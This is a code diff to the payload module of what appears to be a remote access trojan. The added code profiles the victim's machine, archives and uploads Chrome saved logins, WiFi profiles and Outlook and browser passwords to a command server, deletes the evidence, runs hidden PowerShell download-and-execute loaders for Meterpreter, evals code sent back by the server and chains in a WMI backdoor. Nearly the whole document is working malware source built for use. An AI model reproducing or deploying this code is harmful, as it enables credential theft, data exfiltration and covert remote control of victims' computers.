@@ -25,6 +25,49 @@ class payload():
         '''
         return p
     def connect(self):
+        ps1 = '''
+        $SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME) 
+        $UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select SID
+        $env:USERNAME>"$env:temp\\\\basic_info.txt"
+        $UserInfo.SID>>"$env:temp\\\\basic_info.txt"
+        $SysSerialNo.SerialNumber >>"$env:temp\\\\basic_info.txt"
+        '''
+        ps1_js = '''
+        new ActiveXObject("WScript.Shell").Run('powershell.exe -window hidden -enc %s',0,true);
+        //delete after upload
+        function upload(path){
+            var fso = new ActiveXObject("Scripting.FileSystemObject")
+            if (!fso.FileExists(path)) return;
+            try{ 
+                tmp_path = path+".b64"
+                var fso = new ActiveXObject("Scripting.FileSystemObject")
+                if (fso.FileExists(tmp_path)) fso.DeleteFile(tmp_path);
+                r = new ActiveXObject("WScript.Shell").Run("certutil -encode "+path+" "+tmp_path,0,true);
+                fso1=new ActiveXObject("Scripting.FileSystemObject");
+                f=fso1.OpenTextFile(tmp_path,1);
+                message=f.ReadAll();
+                f.Close();
+                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                p.SetTimeouts(0, 0, 0, 0);
+                p.Open("POST","http://{{server}}/check",false);
+                p.Send(escape(message));
+                message = p.ResponseText
+                fso1=new ActiveXObject("Scripting.FileSystemObject");
+                f =fso1.GetFile(tmp_path);
+                f.Delete();
+                f =fso1.GetFile(path);
+                f.Delete();
+            }catch(err){
+                message = '';
+            }
+            return message
+        }
+        var fso = new ActiveXObject("Scripting.FileSystemObject")
+        var tmppath = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2)+'\\\\'
+        var ratcode = upload(tmppath+"basic_info.txt")
+        if(ratcode.length>10) eval(ratcode)
+        else window.close()
+        '''%powershell_encode(ps1)
         client_payload = '''
         fname=Math.random().toString(36).substring(7)
         path=new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2)+'\\\\'+fname
@@ -38,14 +81,17 @@ class payload():
         f.Delete();
         count = message.split('rundll32').length-1;
         if(count == 1){
-            setInterval('try {h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");h.SetTimeouts(0, 0, 0, 0);h.Open("GET", "http://{{server}}/rat/{{signature}}", false);h.Send();c = h.ResponseText;setTimeout(c);}catch(error){windows.close()}', 3000)                   
+           %s
         }else if(count>=3){
            new ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);
         }else{
             window.close();
         }
-        '''
+        '''%ps1_js
         return client_payload
+
+    def begin(self):
+        return '''setInterval('try {h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");h.SetTimeouts(0, 0, 0, 0);h.Open("GET", "http://{{server}}/rat/{{signature}}", false);h.Send();c = h.ResponseText;setTimeout(c);}catch(error){window.close()}', 3000)'''
 
     def cmd(self, command):
         command = command.replace('\\', '\\\\').replace('\"', '\\\"')
@@ -261,12 +307,7 @@ class payload():
     def PowershellMeterpreterx86(self):
         data = '''
         try{
-            x64_path = 'c:\\\\windows\\\\syswow64\WindowsPowerShell\\\\v1.0\\\\powershell.exe'
-            x32_path = 'c:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'
-            var fso = new ActiveXObject("Scripting.FileSystemObject")
-            if (fso.FileExists(x64_path)) path = x64_path;
-            else path = x32_path
-            new ActiveXObject("WScript.Shell").Run(path+' -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\\'http://{{server}}/met_ps/{{signature}}\\');" ',0,true);
+            new ActiveXObject("WScript.Shell").Run('powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\\'http://{{server}}/met_ps/{{signature}}\\');" ',0,true);
             message = "success";
         }catch(err){
             message = err.message;
@@ -278,9 +319,26 @@ class payload():
         '''
         return data
 
-    def init(self):
-        data = '''
+    def Infomation(self):
+        #steal passwords and plant backdoor
+        #http://securityxploded.com/browser-password-dump.php
+        #http://securityxploded.com/outlook-password-dump.php
+        #http://www.nirsoft.net/articles/saved_password_location.html
+
+        #compress chrome,wifi password files
+        #to do: add sougou,leibao,baidu,360 broswer
+        #
+        ps1 = '''
+            (new-object System.Net.WebClient).DownloadFile( "http://%s:%d/static/tools/Rar.exe","$env:temp\\\\rar.exe")
+            cmd /c "$env:temp\\\\rar.exe" A "$env:temp\\\\chrome.rar" "$env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"
+            cmd /c "$env:temp\\\\rar.exe" A "$env:temp\\\\wifi.rar" "$env:ALLUSERSPROFILE\\\\Microsoft\\\\Wlansvc\\\\Profiles\\\\Interfaces" -r
+        '''%(config.host, config.port)
+        
+        data = self.run('powershell.exe -window hidden -enc %s'%powershell_encode(ps1))
+        data += '''
+        //delete after upload
         function upload(path){
+            var fso = new ActiveXObject("Scripting.FileSystemObject")
             if (!fso.FileExists(path)) return;
             try{ 
                 tmp_path = path+".b64"
@@ -299,12 +357,45 @@ class payload():
                 fso1=new ActiveXObject("Scripting.FileSystemObject");
                 f =fso1.GetFile(tmp_path);
                 f.Delete();
+                f =fso1.GetFile(path);
+                f.Delete();
             }catch(err){
                 message = err.message;
             }
         }
-        appdata_path = new ActiveXObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
-        chrome_passfile = appdata_path+'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'
-        upload(chrome_passfile)
+        var fso = new ActiveXObject("Scripting.FileSystemObject")
+        var tmppath = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2)+'\\\\'
+        upload(tmppath+"chrome.rar")
+        upload(tmppath+"wifi.rar")
         '''
+        #broswer and outlook passwords using tools from securityxploded
+        #maybe killed by av
+        ps2 = '''
+            (new-object System.Net.WebClient).DownloadFile( "http://%s:%d/static/tools/OutlookPasswordDump.exe","$env:temp\\\\Outlook.exe")
+            (new-object System.Net.WebClient).DownloadFile( "http://%s:%d/static/tools/BrowserPasswordDump.exe","$env:temp\\\\Browser.exe")
+            cmd /c "$env:temp\\\\Outlook.exe > $env:temp\\\\passinfo.txt"
+            cmd /c "$env:temp\\\\Browser.exe >> $env:temp\\\\passinfo.txt"
+        '''%(config.host, config.port, config.host, config.port)
+        data += self.run('powershell.exe -window hidden -enc %s'%powershell_encode(ps2))
+        data += '''
+        i = 3;
+        while(i--){
+            if(fso.FileExists(tmppath+"passinfo.txt")) break;
+            else delay()
+        }
+        upload(tmppath+"passinfo.txt")
+        '''
+        data += '''
+        new ActiveXObject("WScript.Shell").Run('powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\\'http://{{server}}/ps_info/{{signature}}\\');" ',0,true);
+        upload(tmppath+"Report.rar")
+
+        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+        p.SetTimeouts(0, 0, 0, 0);
+        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
+        p.Send(message);
+        '''
+        return data
+    def init(self):
+        data = self.WmiBackdoor()
+        data += self.Infomation()
         return data
